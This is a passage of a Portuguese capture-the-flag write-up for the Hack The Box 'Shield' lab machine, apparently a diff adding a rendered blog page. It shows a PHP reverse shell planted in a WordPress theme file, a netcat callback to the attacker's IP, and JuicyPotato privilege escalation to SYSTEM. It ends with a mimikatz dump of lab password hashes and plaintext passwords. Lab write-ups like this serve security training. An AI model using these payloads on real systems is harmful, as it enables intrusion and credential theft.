+                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$socket</span>  <span class="p">,</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span><span class="p">(</span><span class="nv">$socket</span>  <span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">'SOCKET'</span><span class="p">,</span> <span class="s1">'STDIN'</span> <span class="p">);</span> <span class="p">}</span> <span class="c1">// read from SOCKET and write to STDIN</span>
+                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDERR'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDERR and write to SOCKET</span>
+                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDOUT'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDOUT and write to SOCKET</span>
+                            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'WINDOWS'</span><span class="p">)</span> <span class="p">{</span>
+                                <span class="c1">// order is important</span>
+                                <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span><span class="cm">/*------*/</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rw</span> <span class="p">(</span><span class="nv">$socket</span>  <span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">'SOCKET'</span><span class="p">,</span> <span class="s1">'STDIN'</span> <span class="p">);</span> <span class="p">}</span> <span class="c1">// read from SOCKET and write to STDIN</span>
+                                <span class="k">if</span> <span class="p">((</span><span class="nv">$fstat</span> <span class="o">=</span> <span class="nb">fstat</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="nv">$fstat</span><span class="p">[</span><span class="s1">'size'</span><span class="p">])</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">brw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDERR'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDERR and write to SOCKET</span>
+                                <span class="k">if</span> <span class="p">((</span><span class="nv">$fstat</span> <span class="o">=</span> <span class="nb">fstat</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="nv">$fstat</span><span class="p">[</span><span class="s1">'size'</span><span class="p">])</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">brw</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$socket</span>  <span class="p">,</span> <span class="s1">'STDOUT'</span><span class="p">,</span> <span class="s1">'SOCKET'</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// read from STDOUT and write to SOCKET</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span>
+                    <span class="c1">// ------ WORK END ------</span>
+
+                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pipes</span> <span class="k">as</span> <span class="nv">$pipe</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipe</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="c1">// ------ SHELL END ------</span>
+
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$socket</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="c1">// ------ SOCKET END ------</span>
+
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s1">'&lt;pre&gt;'</span><span class="p">;</span>
+<span class="c1">// change the host address and/or port number as necessary</span>
+<span class="nv">$sh</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Shell</span><span class="p">(</span><span class="s1">'10.10.15.185'</span><span class="p">,</span> <span class="mi">8443</span><span class="p">);</span>
+<span class="nv">$sh</span><span class="o">-&gt;</span><span class="nf">run</span><span class="p">();</span>
+<span class="k">unset</span><span class="p">(</span><span class="nv">$sh</span><span class="p">);</span>
+<span class="c1">// garbage collector requires PHP v5.3.0 or greater</span>
+<span class="c1">// @gc_collect_cycles();</span>
+<span class="k">echo</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">;</span>
+
+</code></pre></div></div>
+<p><img src="/img/htb/htb-shield-6.png" /></p>
+
+<p>Ao clicar em <code class="language-plaintext highlighter-rouge">Update File</code>, nós salvamos a alteração. Precisamos setar um <code class="language-plaintext highlighter-rouge">netcat</code>, na porta escolhida, no meu caso 8443 e em seguida fazer um curl para o endereço da página <code class="language-plaintext highlighter-rouge">404.php</code>.</p>
+
+<p>Por padrão, o Wordpress salva seus recursos de tema em <code class="language-plaintext highlighter-rouge">wp-content/&lt;nome do tema&gt;/404.php</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
+└─<span class="nv">$ </span>curl 10.10.10.29/wordpress/wp-content/themes/gutenbooster/404.php
+</code></pre></div></div>
+
+<p>E conseguimos o shell.</p>
+
+<p><img src="/img/htb/htb-shield-7.png" /></p>
+
+<p>Esta máquina também não possui a flag de usuário, portanto, precisamos efetuar a escalação de privilégios.</p>
+
+<h2 id="escalação-de-privilégios">Escalação de privilégios</h2>
+
+<p>Ao efetuar a enumeração local, descobrimos que estamos logados com o usuário <code class="language-plaintext highlighter-rouge">iis apppool\wordpress</code> e o sistema tem a arquitetura <code class="language-plaintext highlighter-rouge">x64</code>.</p>
+
+<pre><code class="language-cmd">C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster&gt;whoami
+iis apppool\wordpress
+
+C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster&gt;systeminfo
+
+Host Name:                 SHIELD
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00376-30000-00299-AA303
+Original Install Date:     2/4/2020, 12:58:01 PM
+System Boot Time:          9/6/2021, 8:35:40 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 976 MB
+Virtual Memory: Max Size:  2,431 MB
+Virtual Memory: Available: 1,253 MB
+Virtual Memory: In Use:    1,178 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    MEGACORP.LOCAL
+Logon Server:              N/A
+Hotfix(s):                 4 Hotfix(s) Installed.
+                           [01]: KB3199986
+                           [02]: KB4520724
+                           [03]: KB4524244
+                           [04]: KB4537764
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.29
+                                 [02]: fe80::6c58:513d:ce98:635d
+                                 [03]: dead:beef::6c58:513d:ce98:635d
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster
+</code></pre>
+<p>O Windows Server 2016, assim como algumas outras versões, se não tiver o patch de correção, pode ser vulnerável às vulnerabilidades <code class="language-plaintext highlighter-rouge">Potatoes</code>, no caso da versão 2016, é o <code class="language-plaintext highlighter-rouge">Juice Potato</code>.</p>
+
+<p>Esta vunerabilidade permite a escalção de privilégios. Mais informações sobre as vulnerabilidades <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">aqui</a>.</p>
+
+<p>Após baixar o binário do repositório citado acima, precisamos fazer upload para o servidor, para isso vamos iniciar um server HTTP com python3 e utilizar o comando <code class="language-plaintext highlighter-rouge">certutil do windows</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
+└─<span class="nv">$ </span><span class="nb">mv </span>JuicyPotato.exe jp.exe
+                                                                                                                     
+┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
+└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p>Porém, só conseguimos fazer upload em um diretório em que o usuário tenha permissão de escrita, normalmente o usuário do webserver tem permissões de escrita no diretório <code class="language-plaintext highlighter-rouge">/wp-content/uploads</code>, vamos navegar até lá.</p>
+
+<p><img src="/img/htb/htb-shield-8.png" /></p>
+
+<p>Agora podemos requisitar para nosso HTTP server.</p>
+
+<p><img src="/img/htb/htb-shield-9.png" /></p>
+
+<p>Com o exploit no alvo, precisamos de uma forma de executá-lo e obter acesso administrativo.</p>
+
+<p>Mas antes, precisamos entender como o exploit funciona.</p>
+
+<p>Basiamente ele executa um programa ou executável com privilégios administrativos, podemos executar qualquer programa já existente no Windows, ou criar nosso próprio script <code class="language-plaintext highlighter-rouge">.bat</code> e obter uma conexão reversa.</p>
+
+<p>Poém, para obter a conexão reversa, precisamos de algum executável que possa fazer esta função. A própria distribuição Kali Linux, tem alguns executáveis Windows que podemos aproveitar, inclusive o <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
+
+<p>No diretório <code class="language-plaintext highlighter-rouge">/usr/share/windows-binaries/</code> encontramos o <code class="language-plaintext highlighter-rouge">nc.exe</code>, que podemos copiar para o nosso diretório atual e subir para nosso alvo da mesma forma que subimos o exploit.</p>
+
+<p><img src="/img/htb/htb-shield-10.png" /></p>
+
+<p>Com o netcat na máquina alvo, podemos usar o próprio <code class="language-plaintext highlighter-rouge">echo</code> do Windows para criarmos um script <code class="language-plaintext highlighter-rouge">reverse.bat</code> com o comando para nos enviar um Power Shell com o netcat.</p>
+
+<pre><code class="language-cmd">C:\inetpub\wwwroot\wordpress\wp-content\uploads&gt;echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.185 8444 &gt; reverse.bat  
+</code></pre>
+<p><img src="/img/htb/htb-shield-11.png" /></p>
+
+<p>Com tuddo pronto, podemos setar um netcat para ouvir na porta 8444, que foi a utilizada em nosso script e enviar o comando para o exploit.</p>
+
+<pre><code class="language-cmd">C:\inetpub\wwwroot\wordpress\wp-content\uploads&gt;jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\reverse.bat -l 1337
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+</code></pre>
+
+<p>O exploit executou nosso script e nos deu um reverse shell com privilégios administrativos!!!</p>
+
+<p><img src="/img/htb/htb-shield-12.png" /></p>
+
+<p>A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no Desktop do Administrator.</p>
+
+<h2 id="pós-exploração">Pós exploração</h2>
+
+<p>Ainda podemos checar a possibilidade de obter senhas de outros usuários do Windows Server, e como sabemos que no <code class="language-plaintext highlighter-rouge">Starting Point</code> senhas são valiosas, não custa tentar.</p>
+
+<p>Na própria distribuição Kali Linux, no diretório <code class="language-plaintext highlighter-rouge">/usr/share/windows-resources/</code>, encontramos mais executáveis, entre eles o <code class="language-plaintext highlighter-rouge">mimikatz.exe</code>, podemos copiar a versão de 64 bits para nosso diretório atual e subir para o alvo da mesma forma que fizemos antes.</p>
+
+<p><img src="/img/htb/htb-shield-13.png" /></p>
+
+<p>Agora em nosso shell administrativo, podemos executá-lo.</p>
+
+<p><img src="/img/htb/htb-shield-14.png" /></p>
+
+<p>Com o comando <code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>, obtemos o dump de todos as senhas em cache.</p>
+
+<pre><code class="language-cmd">
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 66298 (00000000:000102fa)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:07 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+        tspkg :
+        wdigest :
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : SHIELD$
+         * Domain   : MEGACORP.LOCAL
+         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SHIELD$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:07 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+        tspkg :
+        wdigest :
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : shield$
+         * Domain   : MEGACORP.LOCAL
+         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 36467 (00000000:00008e73)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:07 PM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 308037 (00000000:0004b345)
+Session           : Interactive from 1
+User Name         : sandra
+Domain            : MEGACORP
+Logon Server      : PATHFINDER
+Logon Time        : 9/7/2021 5:15:25 PM
+SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
+        msv :
+         [00000003] Primary
+         * Username : sandra
+         * Domain   : MEGACORP
+         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
+         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
+         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
+        tspkg :
+        wdigest :
+         * Username : sandra
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 167946 (00000000:0002900a)
+Session           : Service from 0
+User Name         : wordpress
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:32 PM
+SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
+        msv :
+         [00000003] Primary
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+        tspkg :
+        wdigest :
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : SHIELD$
+         * Domain   : MEGACORP.LOCAL
+         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:11 PM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:08 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 66277 (00000000:000102e5)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:07 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+        tspkg :
+        wdigest :
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : SHIELD$
+         * Domain   : MEGACORP.LOCAL
+         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SHIELD$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 9/7/2021 5:14:07 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : SHIELD$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : shield$
+         * Domain   : MEGACORP.LOCAL
+         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8&lt;Kx'\*9e&lt;s`ZV uNjoe Q%\_mX&lt;Eo%lB:NM6@-a+qJt_l887Ew&amp;m_ewr??#VE&amp;
+        ssp :
+        credman :
+
+mimikatz # 
+</code></pre>
+<p>E entre os dados do dump, conseguimos as seguintes credenciais:</p>
+
+<pre><code class="language-cmd">        kerberos :
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
+</code></pre>
+
+<p><br /></p>
+
+<p>E comprometemos o server!!
+<br /></p>
+
+<p><img src="/img/htb/hackerman.gif" />
+<br /></p>
+<h3 id="referências">Referências</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Vulnerabilidade</th>
+      <th>Url</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Juicy Potato</td>
+      <td><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato</a></td>
+    </tr>
+  </tbody>
+</table>
+
